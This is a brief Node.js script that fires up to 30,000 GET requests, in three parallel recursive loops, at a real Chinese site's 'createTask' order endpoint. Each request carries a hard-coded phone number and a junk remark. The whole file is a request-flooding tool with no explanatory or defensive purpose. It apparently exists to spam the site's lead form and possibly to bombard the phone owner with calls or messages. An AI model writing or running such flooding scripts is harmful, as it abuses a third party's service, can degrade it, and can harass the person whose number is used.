const request = require('request')
// let j = request.jar();
const url = 'http://n.daoxila.com/taskOrder?act=createTask&phone=13601681020&remark=wer&order_from=front_WAP_%E5%85%A8%E5%9B%BD_Event_ActivityId2&frontEventId=2&callback=jQuery21007111117246229477_1526958223871';
const options = {
    url: encodeURI(url),
    method: 'GET',
}
// j.setCookie(request.cookie(`PHPSESSID=ca6pj3K7yppD0NkBIHy-kiwVdg`), url, function (){});

let a = 0;

const start1 = () => {
    if (a < 10000) {
        request(options, function (err, res, body) {
            if (err) {
               console.log(err)
            }
            if (body) {
                console.log(body)
                a++
                start1()
            }
        })
    }
}

start1()

let b = 0;

const start2 = () => {
    if (b < 10000) {
        request(options, function (err, res, body) {
            if (err) {
               console.log(err)
            }
            if (body) {
                console.log(body)
                b++
                start2()
            }
        })
        
    }
}

start2()

let c = 0;

const start3 = () => {
    if (c < 10000) {
        request(options, function (err, res, body) {
            if (err) {
               console.log(err)
            }
            if (body) {
                console.log(body)
                c++
                start3()
            }
        })
        
    }
}

start3()


